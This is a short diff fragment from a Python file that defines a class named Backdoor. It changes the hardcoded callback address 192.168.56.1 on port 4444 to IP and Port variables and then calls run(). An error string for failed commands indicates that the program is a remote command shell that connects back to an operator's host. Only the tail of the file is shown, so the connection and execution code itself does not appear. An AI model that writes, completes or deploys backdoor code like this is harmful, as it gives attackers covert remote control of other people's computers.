@@ -65,5 +65,5 @@ class Backdoor:
                command_result = "[-] Error in command."
     
 
-my_backdoor = Backdoor("192.168.56.1", 4444)
+my_backdoor = Backdoor(IP, Port)
 my_backdoor.run()
